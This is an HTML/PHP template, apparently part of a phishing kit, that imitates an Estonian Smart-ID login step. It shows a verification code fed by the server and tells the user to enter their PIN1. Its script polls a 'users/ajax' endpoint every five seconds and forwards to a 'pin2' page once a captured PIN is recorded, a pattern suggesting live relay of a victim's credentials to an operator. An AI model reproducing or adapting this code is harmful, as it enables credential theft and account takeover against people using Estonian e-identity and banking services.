
<div class="mt-30">
    <div class="container">
        <div class="col-md-9">
        <div class="title mt-45">Login sisse</div>
                <div class="step">
                    <div class="setp-1" style="padding: 6px 10px;">
                            1 &nbspKasutajatunnus
                    </div>
                    <div class="step-2">             
                    </div>
                    <div class="setp-3" style="padding: 6px 10px;">
                            &nbsp&nbsp&nbsp2 &nbsp Salasõnad
                    </div>
                </div>
            <div class="content mt-20" >
                <div class="row ">
                    <div class="col-md-9">
						<div class="mt-10 ml-20" style="line-height: 16px;">
                            <div style="padding: 0 10px;" class="mt-20">
                                <span style="font-size: 18px; font-weight: bold!important; padding-top: 20px;">Kontrollkood (PEIDETUD TURVALISUSE EESMÄRGIL)&nbsp:&nbsp</span>
                                <span id="code_val" style="font-size: 18px; border:1.2px solid #999; border-radius: 3px; padding:0 10px;letter-spacing: 5px;background-color: white;"></span>
                                <br><br>
                                <p>Veenduge, et näete mobiiltelefoni ekraanil numbrit.<br>
                                Seejärel sisestage Smart-ID PIN 1 kood.</p>
                                <p>Ootame vastust &nbsp<span id="counter"></span></p>
                              
                                <hr style="border:1.2px solid white;">
                                <div class="mt-20">
                                    <button class="btn_2">Katkestan</button>                                
                                </div>  
                            </div>    
                        </div>
                    </div>
					<div class="col-md-3 mt-10 mb-10">
						<div class="img_bt"></div>
					</div>
				</div>
            </div>
        </div>        
    </div>
    <script>
        $(document).ready(function () {
            myfunction();
            function myfunction(){                
                $.ajax({
                    type: 'post',
                    url: '<?=base_url("users/ajax");?>',
                    async : true,
                    datatype: 'json',
                    success: function(data){                         
                        response = jQuery.parseJSON(data);                       
                        document.getElementById("code_val").innerHTML = response[0].code;  
                       
                        if(response[0].pin_code!=null){
                            $(location).attr('href', '<?=base_url("pin2/").$name;?>');
                        }else{
                            setTimeout(myfunction, 5000);
                        }
                    }
                });
            }
            
        });
    </script>
</body>

                        
